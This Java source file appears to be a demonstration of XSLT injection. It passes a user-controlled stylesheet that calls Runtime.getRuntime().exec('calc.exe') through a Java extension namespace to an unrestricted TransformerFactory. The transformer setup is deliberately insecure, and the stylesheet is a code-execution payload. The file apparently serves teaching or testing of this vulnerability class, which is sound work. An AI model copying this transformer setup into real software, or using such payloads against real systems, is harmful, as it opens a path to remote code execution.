package xslt;

import javax.xml.transform.Source;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;
import java.io.StringReader;
import java.io.StringWriter;

public class Main {
    public static void main(String[] args){
        try {
            // Malicious XSLT (user-controlled input)
            String xsltData = "<?xml version=\"1.0\"?>\n" +
                    "<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\n" +
                    "    <xsl:template match=\"/\">\n" +
                    "        <!-- Call Java's Runtime.exec() method -->\n" +
                    "        <xsl:value-of select=\"java:Runtime.getRuntime().exec('calc.exe')\"/>\n" +
                    "    </xsl:template>\n" +
                    "</xsl:stylesheet>";

            // XML input (can be any valid XML)
            String xmlData = "<?xml version=\"1.0\"?>\n" +
                    "<users>\n" +
                    "    <user>\n" +
                    "        <name>Alice</name>\n" +
                    "        <role>Admin</role>\n" +
                    "    </user>\n" +
                    "    <user>\n" +
                    "        <name>Bob</name>\n" +
                    "        <role>User</role>\n" +
                    "    </user>\n" +
                    "</users>";

            // Set up XML and XSLT sources
            Source xmlSource = new StreamSource(new StringReader(xmlData));
            Source xsltSource = new StreamSource(new StringReader(xsltData));

            // Perform the transformation
            StringWriter output = new StringWriter();
            TransformerFactory factory = TransformerFactory.newInstance();
            Transformer transformer = factory.newTransformer(xsltSource); // ⚠️ User-controlled XSLT
            transformer.transform(xmlSource, new StreamResult(output));

            System.out.println("Transformation complete.");
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}
